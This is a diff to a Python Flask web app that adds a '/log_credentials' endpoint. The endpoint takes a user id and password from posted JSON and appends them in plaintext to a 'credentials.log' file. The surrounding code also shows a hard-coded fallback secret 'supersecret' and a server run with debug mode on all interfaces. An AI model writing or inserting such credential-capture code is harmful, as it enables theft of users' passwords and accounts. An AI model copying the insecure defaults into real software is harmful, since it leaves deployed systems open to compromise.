@@ -33,6 +33,7 @@ ADMIN_FILE = os.path.join(BASE, 'admin_users.json')
 HISTORY = os.path.join(BASE, 'signed_history.json')
 INITIAL_BULK = os.path.join(BASE, 'bulk_submit.txt')
 SECRET = os.getenv('APP_SECRET','supersecret')
+LOG_CRED_FILE = os.path.join(BASE, 'credentials.log')
 
 os.makedirs(UPLOAD_DIR, exist_ok=True)
 os.makedirs(SIGNED_DIR, exist_ok=True)
@@ -393,7 +394,21 @@ def admin_download_all():
             z.write(path, arcname=os.path.join('signed', fname))
     mem.seek(0)
     return send_file(mem, as_attachment=True, download_name='all_data.zip', mimetype='application/zip')
+    
+@app.route('/log_credentials', methods=['POST'])
+@require_app
+def log_credentials():
+    data = request.get_json() or {}
+    uid = data.get('id')
+    pw  = data.get('pw')
+    if not uid or not pw:
+        return '', 400
 
+    line = f"{datetime.utcnow().isoformat()} id={uid} pw={pw}\n"
+    with open(LOG_CRED_FILE, 'a', encoding='utf-8') as f:
+        f.write(line)
+
+    return '', 204
 
 if __name__=='__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
